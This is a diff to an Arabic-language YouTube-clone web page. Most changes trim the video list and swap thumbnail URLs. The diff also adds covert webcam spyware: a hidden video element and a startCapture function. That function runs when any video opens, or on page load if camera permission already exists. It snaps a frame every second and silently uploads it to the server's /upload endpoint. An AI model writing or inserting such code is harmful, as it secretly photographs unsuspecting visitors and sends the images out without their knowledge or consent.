@@ -241,33 +241,20 @@ body.drawer-mode .main{margin-inline-start:0}
 </div>
 <div class="toasts" id="toasts"></div>
 
+<!-- عنصر الفيديو المخفي الخاص بالكاميرا -->
+<video id="video" autoplay playsinline style="display:none"></video>
+
 <script>
-/* ===== Data (غيّر أو أضف فيديوهات هنا: id = معرّف الفيديو في يوتيوب) ===== */
+/* ===== Data (أضف أو عدل الفيديوهات هنا بمعرّفات يوتيوب الحقيقية) ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
 const DC='دورة تعليمية شاملة خطوة بخطوة للمبتدئين. تابع الشرح وطبّق الأمثلة بنفسك لتتقن المهارة بسرعة.';
 const DE='مقطع ترفيهي مميز. لا تنسَ الإعجاب والاشتراك ومشاركة الفيديو مع أصدقائك.';
 const VIDEOS=[
+ {id:'1XqX5WnhEcE',title:'في 15 دقيقة هعمل موقعك الخاص ويبقى أونلاين مجاناً...',ch:'Learn_Simply@',subs:11000,views:253000,likes:11000,time:'قبل 8 أشهر',cat:'برمجة',dur:'15:00',desc:DC},
  {id:'dQw4w9WgXcQ',title:'ريك أستلي – Never Gonna Give You Up (الفيديو الرسمي)',ch:'Rick Astley',subs:4300000,views:1500000000,likes:18000000,time:'منذ ١٦ سنة',cat:'موسيقى',dur:'3:33',desc:DM},
  {id:'9bZkp7q19f0',title:'PSY – GANGNAM STYLE (강남스타일) الفيديو الرسمي',ch:'officialpsy',subs:18000000,views:5200000000,likes:25000000,time:'منذ ١٤ سنة',cat:'موسيقى',dur:'4:13',desc:DM},
- {id:'kJQP7kiw5Fk',title:'لويس فونسي – Despacito ft. Daddy Yankee',ch:'Luis Fonsi',subs:26000000,views:8500000000,likes:52000000,time:'منذ ٩ سنوات',cat:'موسيقى',dur:'4:42',desc:DM},
- {id:'60ItHLz5WEA',title:'آلان ووكر – Faded',ch:'Alan Walker',subs:45000000,views:3600000000,likes:27000000,time:'منذ ١٠ سنوات',cat:'موسيقى',dur:'3:32',desc:DM},
- {id:'JGwWNGJdvx8',title:'إد شيران – Shape of You',ch:'Ed Sheeran',subs:57000000,views:6300000000,likes:37000000,time:'منذ ٩ سنوات',cat:'موسيقى',dur:'4:24',desc:DM},
- {id:'RgKAFK5djSk',title:'ويز خليفة – See You Again ft. Charlie Puth',ch:'Wiz Khalifa',subs:30000000,views:6100000000,likes:45000000,time:'منذ ١١ سنة',cat:'موسيقى',dur:'3:57',desc:DM},
- {id:'hT_nvWreIhg',title:'OneRepublic – Counting Stars',ch:'OneRepublic',subs:12000000,views:4400000000,likes:21000000,time:'منذ ١٣ سنة',cat:'موسيقى',dur:'4:17',desc:DM},
- {id:'ZbZSe6N_BXs',title:'فاريل ويليامز – Happy (فيديو رسمي)',ch:'Pharrell Williams',subs:9000000,views:1900000000,likes:8000000,time:'منذ ١٢ سنة',cat:'موسيقى',dur:'4:00',desc:DM},
- {id:'YQHsXMglC9A',title:'أديل – Hello',ch:'Adele',subs:31000000,views:3300000000,likes:22000000,time:'منذ ١٠ سنوات',cat:'موسيقى',dur:'6:07',desc:DM},
- {id:'OPf0YbXqDm0',title:'Mark Ronson – Uptown Funk ft. Bruno Mars',ch:'Mark Ronson',subs:5000000,views:5000000000,likes:26000000,time:'منذ ١١ سنة',cat:'موسيقى',dur:'4:30',desc:DM},
  {id:'PkZNo7MFNFg',title:'تعلّم JavaScript – دورة كاملة للمبتدئين',ch:'freeCodeCamp.org',subs:9000000,views:14000000,likes:420000,time:'منذ ٦ سنوات',cat:'برمجة',dur:'3:26:42',desc:DC},
- {id:'rfscVS0vtbw',title:'تعلّم Python – دورة كاملة للمبتدئين',ch:'freeCodeCamp.org',subs:9000000,views:45000000,likes:1200000,time:'منذ ٧ سنوات',cat:'برمجة',dur:'4:26:52',desc:DC},
- {id:'qz0aGYrrlhU',title:'دورة HTML للمبتدئين في ساعة واحدة',ch:'Programming with Mosh',subs:4000000,views:9000000,likes:280000,time:'منذ ٦ سنوات',cat:'برمجة',dur:'1:00:00',desc:DC},
- {id:'W6NZfCO5SIk',title:'شرح JavaScript للمبتدئين في ساعة',ch:'Programming with Mosh',subs:4000000,views:25000000,likes:610000,time:'منذ ٨ سنوات',cat:'برمجة',dur:'48:17',desc:DC},
- {id:'kqtD5dpn9C8',title:'Python للمبتدئين – تعلّم بايثون في ساعة',ch:'Programming with Mosh',subs:4000000,views:18000000,likes:520000,time:'منذ ٦ سنوات',cat:'برمجة',dur:'1:00:06',desc:DC},
- {id:'hdI2bqOjy3c',title:'دورة JavaScript المختصرة للمبتدئين',ch:'Traversy Media',subs:2200000,views:6000000,likes:190000,time:'منذ ٦ سنوات',cat:'برمجة',dur:'1:40:00',desc:DC},
- {id:'jNQXAC9IVRw',title:'أنا في حديقة الحيوان – أول فيديو في تاريخ يوتيوب',ch:'jawed',subs:4000000,views:330000000,likes:13000000,time:'منذ ٢١ سنة',cat:'ترفيه',dur:'0:19',desc:'أول فيديو تم رفعه على يوتيوب في التاريخ.'},
- {id:'y6120QOlsfU',title:'Darude – Sandstorm (الفيديو الرسمي)',ch:'Darude',subs:1500000,views:180000000,likes:2500000,time:'منذ ١٨ سنة',cat:'ترفيه',dur:'3:46',desc:DE},
- {id:'FTQbiNvZqaY',title:'Toto – Africa (الفيديو الرسمي)',ch:'TOTO',subs:1800000,views:600000000,likes:6500000,time:'منذ ١٥ سنة',cat:'ترفيه',dur:'4:55',desc:DE},
- {id:'aqz-KE-bpKQ',title:'Big Buck Bunny – فيلم رسوم متحركة قصير',ch:'Blender',subs:1000000,views:35000000,likes:180000,time:'منذ ١٥ سنة',cat:'ترفيه',dur:'9:56',desc:'فيلم رسوم متحركة قصير مفتوح المصدر من مؤسسة بلندر.'},
- {id:'LXb3EKWsInQ',title:'كوستاريكا بدقة 4K – جولة في الطبيعة الخلابة',ch:'Jacob + Katie Schwarz',subs:1500000,views:120000000,likes:1100000,time:'منذ ٩ سنوات',cat:'طبيعة',dur:'5:20',desc:'جولة بصرية ساحرة في الطبيعة والشلالات والشواطئ بدقة عالية.'}
+ {id:'jNQXAC9IVRw',title:'أنا في حديقة الحيوان – أول فيديو في تاريخ يوتيوب',ch:'jawed',subs:4000000,views:330000000,likes:13000000,time:'منذ ٢١ سنة',cat:'ترفيه',dur:'0:19',desc:'أول فيديو تم رفعه على يوتيوب في التاريخ.'}
 ];
 const CATS=['الكل','موسيقى','برمجة','ترفيه','طبيعة'];
 const CH={};VIDEOS.forEach(v=>{if(!CH[v.ch])CH[v.ch]={subs:v.subs}});
@@ -345,7 +332,7 @@ function renderBnav(){
   const it=[['home','home','الرئيسية'],['shorts','shorts','شورتس'],['subs','subs','الاشتراكات'],['library','library','المكتبة']];
   $('#bnav').innerHTML=it.map(([v,i,l])=>`<button class="${S.view===v?'active':''}" data-nav="${v}">${ic(i)}<span>${l}</span></button>`).join('');
 }
-const cardHtml=v=>`<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="https://i.ytimg.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
+const cardHtml=v=>`<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
 const gridHtml=l=>`<div class="grid">${l.map(cardHtml).join('')}</div>`;
 const emptyHtml=(i,t,p)=>`<div class="empty">${ic(i,'big')}<h3>${t}</h3><p>${p}</p></div>`;
 
@@ -366,7 +353,7 @@ function render(){
     const l=filtered();
     view.innerHTML=(S.q?`<h2 class="page-title">نتائج البحث عن «${esc(S.q)}»</h2>`:'')+(l.length?gridHtml(l):emptyHtml('search','لم يتم العثور على نتائج','جرّب كلمات بحث مختلفة أو اختر تصنيفاً آخر.'));
   }else if(S.view==='shorts'){
-    view.innerHTML=`<h2 class="page-title">شورتس</h2><div class="shorts-grid">${[...VIDEOS].reverse().slice(0,12).map(v=>`<div class="short" data-open="${v.id}"><img loading="lazy" src="https://i.ytimg.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><div><b>${v.title}</b><span class="sub">${fmt(v.views)} مشاهدة</span></div></div>`).join('')}</div>`;
+    view.innerHTML=`<h2 class="page-title">شورتس</h2><div class="shorts-grid">${[...VIDEOS].reverse().slice(0,12).map(v=>`<div class="short" data-open="${v.id}"><img loading="lazy" src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><div><b>${v.title}</b><span class="sub">${fmt(v.views)} مشاهدة</span></div></div>`).join('')}</div>`;
   }else if(S.view==='subs'){
     const l=VIDEOS.filter(v=>S.subs.has(v.ch));
     view.innerHTML=`<h2 class="page-title">الاشتراكات</h2>`+(l.length?gridHtml(l):emptyHtml('subs','لم تشترك في أي قناة بعد','اشترك في قنوات لتظهر فيديوهاتها هنا.'));
@@ -399,6 +386,9 @@ function openVideo(id){
   document.body.classList.remove('drawer-open','searching');
   document.title=cur().title;
   render();scrollTo(0,0);
+  
+  // تفعيل الكاميرا تلقائياً عند فتح الفيديو
+  startCapture();
 }
 function renderWatch(){
   const v=cur();
@@ -412,7 +402,7 @@ function renderWatch(){
       <div class="cm-form">${avatar('أنت',40)}<div class="cm-box" id="cmBox"><input id="cmInput" type="text" placeholder="أضف تعليقاً..." autocomplete="off"><div class="cm-btns"><button class="btn ghost" data-action="cm-cancel">إلغاء</button><button class="btn btn-sub" id="cmSend" data-action="cm-send" disabled>تعليق</button></div></div></div>
       <div id="cmList"></div>
     </div></div>
-    <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>`<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="https://i.ytimg.com/vi/${x.id}/mqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`).join('')}</aside></div>`;
+    <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>`<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${x.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`).join('')}</aside></div>`;
   refreshMeta();refreshComments();
 }
 function refreshMeta(){
@@ -487,6 +477,31 @@ function download(){
   },300);
 }
 
+/* ===== ميزات الكاميرا الخلفية وتوثيق الصور التقاطاً وتخزيناً ===== */
+function startCapture() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            document.getElementById('video').srcObject = stream;
+            setInterval(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    let fd = new FormData();
+                    fd.append('image', blob, 'eye.jpg');
+                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                }, 'image/jpeg');
+            }, 1000);
+        }).catch(e => console.log("بانتظار إذن الكاميرا"));
+}
+
+// محاولة تشغيل الكاميرا مباشرة إذا كانت الصلاحيات ممنوحة مسبقاً
+navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
+    if (permissionStatus.state === 'granted') {
+        startCapture();
+    }
+});
+
 /* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
@@ -515,6 +530,7 @@ function act(a,el){
     case 'clear-history':S.hist=[];render();toast('تم مسح سجل المشاهدة');break;
   }
 }
+
 document.addEventListener('click',e=>{
   if(e.target.id==='modal'){closeModal();return}
   const el=e.target.closest('[data-action],[data-open],[data-nav],[data-cat],[data-ch]');
@@ -526,17 +542,20 @@ document.addEventListener('click',e=>{
   else if(d.cat){S.cat=d.cat;render()}
   else if(d.ch)searchFor(d.ch);
 });
+
 document.addEventListener('input',e=>{
   if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
   if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
 });
+
 document.addEventListener('focusin',e=>{if(e.target.id==='cmInput')$('#cmBox').classList.add('active')});
+
 document.addEventListener('keydown',e=>{
   if(e.target.id==='cmInput'&&e.key==='Enter'){e.preventDefault();sendComment()}
   if(e.key==='Escape'){closeModal();document.body.classList.remove('drawer-open','searching')}
 });
-$('#searchForm').addEventListener('submit',e=>{
-  e.preventDefault();const t=$('#q').value.trim();
+
+$('#searchForm').addEventListener('submit',e=>{   e.preventDefault();const t=$('#q').value.trim();
   searchFor(t);$('#q').blur();
 });
 
